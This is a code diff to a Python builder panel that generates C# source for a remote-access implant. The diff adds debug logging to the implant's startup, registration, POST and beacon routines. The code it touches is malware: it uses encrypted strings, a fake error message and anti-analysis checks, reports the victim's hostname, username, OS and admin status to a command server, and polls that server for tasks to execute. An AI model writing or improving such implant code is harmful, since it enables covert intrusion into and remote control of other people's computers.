@@ -1138,8 +1138,14 @@ def panel_build():
         'debug': data.get('debug', False),
     }
 
+    if bc['debug']:
+        bc['hidden'] = False  # Always show console in debug mode
+
     if not bc['server']:
         return jsonify({'ok': False, 'error': 'Server URL required'}), 400
+
+    if not bc['server'].startswith('http://') and not bc['server'].startswith('https://'):
+        bc['server'] = 'http://' + bc['server']
 
     if bc['id'] == 'AUTO':
         bc['id'] = secrets.token_hex(8)
@@ -1449,6 +1455,7 @@ def generate_agent_source(bc):
         "        static string _commKeyHex;\n"
         "        static int _beaconInterval = " + str(bc['beacon']) + ";\n"
         "        static bool _debug = " + ('true' if bc['debug'] else 'false') + ";\n"
+        "        static void Log(string msg) { if(_debug) { Console.WriteLine(\"[\" + DateTime.Now.ToString(\"HH:mm:ss\") + \"] \" + msg); } }\n"
         "\n"
         "        // ---- State ----\n"
         "        static bool _running = true;\n"
@@ -1507,6 +1514,10 @@ def generate_agent_source(bc):
         '                _processName = DecStr("' + enc_name + '");\n'
         '                _commKeyHex = DecStr("' + enc_comm_key + '");\n'
         "\n"
+        '                Log("=== AGENT STARTING ===");\n'
+        '                Log("Server: " + _server);\n'
+        '                Log("Client ID: " + _clientId);\n'
+        "\n"
         "                " + fake_error_call + "\n"
         "\n"
         "                // Anti-Analysis\n"
@@ -1541,6 +1552,7 @@ def generate_agent_source(bc):
         "        // ==== COMMS ====\n"
         "        static string Post(string url, string json) {\n"
         "            try {\n"
+        '                Log("POST --> " + url);\n'
         "                var req = (HttpWebRequest)WebRequest.Create(url);\n"
         '                req.Method = "POST";\n'
         '                req.ContentType = "application/json";\n'
@@ -1557,13 +1569,17 @@ def generate_agent_source(bc):
         "                req.ContentLength = data.Length;\n"
         "                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);\n"
         "                using (var r = (HttpWebResponse)req.GetResponse())\n"
-        "                using (var sr = new StreamReader(r.GetResponseStream()))\n"
-        "                    return sr.ReadToEnd();\n"
-        '            } catch { return "{}"; }\n'
+        "                using (var sr = new StreamReader(r.GetResponseStream())) {\n"
+        "                    string response = sr.ReadToEnd();\n"
+        '                    Log("POST Response: " + response);\n'
+        "                    return response;\n"
+        "                }\n"
+        '            } catch (Exception ex) { Log("POST ERROR (" + url + "): " + ex.Message); return "{}"; }\n'
         "        }\n"
         "\n"
         "        static void Register() {\n"
         "            try {\n"
+        '                Log("Registering agent...");\n'
         "                string hostname = Environment.MachineName;\n"
         "                string username = Environment.UserName;\n"
         "                string os = Environment.OSVersion.ToString();\n"
@@ -1602,7 +1618,8 @@ def generate_agent_source(bc):
         "                    Esc(_clientId), Esc(hostname), Esc(username),\n"
         '                    Esc(os), isAdmin ? "true" : "false", fingerprint);\n'
         '                Post(_server + "/api/agent/register", json);\n'
-        "            } catch {}\n"
+        '                Log("Registration format valid, sent POST");\n'
+        '            } catch (Exception ex) { Log("Register Exception: " + ex.Message); }\n'
         "        }\n"
         "\n"
         "        static string HashString(string s) {\n"
@@ -1613,20 +1630,23 @@ def generate_agent_source(bc):
         "        }\n"
         "\n"
         "        static void Beacon() {\n"
-        '            string json = string.Format("{{\\\"id\\\":\\\"{0}\\\"}}", Esc(_clientId));\n'
-        '            string resp = Post(_server + "/api/agent/beacon", json);\n'
-        "\n"
         "            try {\n"
+        '                Log("Sending beacon...");\n'
+        '                string json = string.Format("{{\\\"id\\\":\\\"{0}\\\"}}", Esc(_clientId));\n'
+        '                string resp = Post(_server + "/api/agent/beacon", json);\n'
+        "\n"
         '                if (resp.Contains("\\"t\\":[")) {\n'
+        '                    Log("Found tasks in beacon response");\n'
         '                    int start = resp.IndexOf("\\"t\\":[") + 4;\n'
         "                    int end = resp.LastIndexOf(']') + 1;\n"
         "                    string tasksStr = resp.Substring(start, end - start);\n"
         "                    var tasks = ParseTaskArray(tasksStr);\n"
         "                    foreach (var task in tasks) {\n"
-        "                        try { HandleTask(task); } catch {}\n"
+        '                        Log("Handling task...");\n'
+        "                        try { HandleTask(task); } catch (Exception tx) { Log(\"Task Handle Error: \" + tx.Message); }\n"
         "                    }\n"
         "                }\n"
-        "            } catch {}\n"
+        '            } catch (Exception ex) { Log("Beacon Exception: " + ex.Message); }\n'
         "        }\n"
         "\n"
         "        static List<Dictionary<string, string>> ParseTaskArray(string json) {\n"
